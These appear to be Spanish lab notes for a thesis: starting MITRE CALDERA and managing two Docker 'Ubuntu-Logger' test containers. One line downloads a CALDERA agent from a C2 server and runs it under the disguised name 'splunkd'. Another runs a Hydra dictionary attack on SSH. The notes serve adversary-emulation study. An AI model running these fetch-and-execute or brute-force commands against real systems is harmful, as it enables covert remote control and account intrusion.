## CALDERA

```bash
# Clonar el repositorio de CALDERA
git clone https://github.com/mitre/caldera.git --recursive
cd caldera 
python server.py --insecure
```

## DOCKER

```bash
cd ~/Documents/TFG/ubuntu

# Levantar el contenedor Ubuntu-Logger
docker build -t ubuntu-logger .

# Crear máquina Ubuntu-Logger-1
docker run -d --name ubuntu-logger-1 ubuntu-logger
docker exec -it ubuntu-logger-1 /bin/bash

# Iniciar la máquina Ubuntu-Logger-1
docker start ubuntu-logger-1

# Crear máquina Ubuntu-Logger-2
docker run -d --name ubuntu-logger-2 ubuntu-logger
docker exec -it ubuntu-logger-2 /bin/bash

# Iniciar la máquina Ubuntu-Logger-2
docker start ubuntu-logger-2

# Desplegar el agente dentro del contenedor
server="http://10.0.2.15:8888";curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;chmod +x splunkd;./splunkd -server $server -group red -v

# Ataque por diccionario al servicio SSH mediante Hydra
hydra -l test-user -P /usr/share/wordlists/rockyou.txt.gz ssh://172.17.0.2 

# Eliminar contenedores
docker kill ubuntu-logger-1
docker rm ubuntu-logger-1
docker kill ubuntu-logger-2
docker rm ubuntu-logger-2

docker image rm ubuntu-logger:latest --force
```
